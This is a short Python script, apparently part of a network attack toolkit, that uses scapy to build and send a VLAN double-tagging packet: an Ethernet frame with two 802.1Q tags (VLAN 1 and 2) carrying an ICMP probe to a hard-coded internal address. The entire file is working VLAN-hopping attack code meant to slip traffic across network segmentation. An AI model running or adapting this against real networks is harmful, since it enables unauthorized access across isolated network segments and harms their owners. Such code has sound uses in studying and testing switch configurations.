import socket
from scapy.all import *
from utils.GetIpMac import *


class vlanlib:
	target_ip=''
	target_arp=''
	host_ip=''
	host_arp=''
	def __init__(self,target_ip='0.0.0.0'):
		self.target_ip=target_ip
		self.target_arp=getmacbyip(target_ip)
		self.host_ip=get_ip_address('eth0')
		self.host_arp=get_mac_address()
	def run_vlanhopping(self):
		packet=Ether(dst=self.target_arp)/Dot1Q(vlan=1)/Dot1Q(vlan=2)/IP(dst=self.target_ip)/ICMP()
		sendp(packet,iface='eth0')


if __name__=='__main__':
	a=vlanlib("192.168.237.66")
	a.run_vlanhopping()


